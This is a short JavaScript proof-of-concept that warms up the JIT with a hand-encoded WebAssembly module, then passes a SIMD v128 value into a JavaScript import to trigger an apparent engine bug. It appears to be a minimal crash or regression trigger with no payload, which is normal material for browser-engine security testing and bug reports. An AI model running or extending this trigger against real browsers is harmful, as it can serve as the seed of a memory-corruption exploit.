function poc(trigger) {
    const js_import = (arg) => {
        if (trigger) {
            arg.x;
        }
    };

    const wasmCode = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60,
        0x01, 0x7b, 0x00, 0x60, 0x00, 0x00, 0x02, 0x0b, 0x01, 0x03, 0x69, 0x6d,
        0x70, 0x01, 0x66, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x09, 0x01,
        0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01, 0x0a, 0x19, 0x01, 0x17, 0x00,
        0xfd, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00,
        0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x10, 0x00, 0x0b
    ]);

    const importObject = { imp: { f: js_import } };

    try {
        const wasmModule = new WebAssembly.Module(wasmCode);
        const instance = new WebAssembly.Instance(wasmModule, importObject);
        instance.exports.main();
    } catch (e) {}
}

for (let i = 0; i < 100; i++) {
    poc(false);
}

poc(true);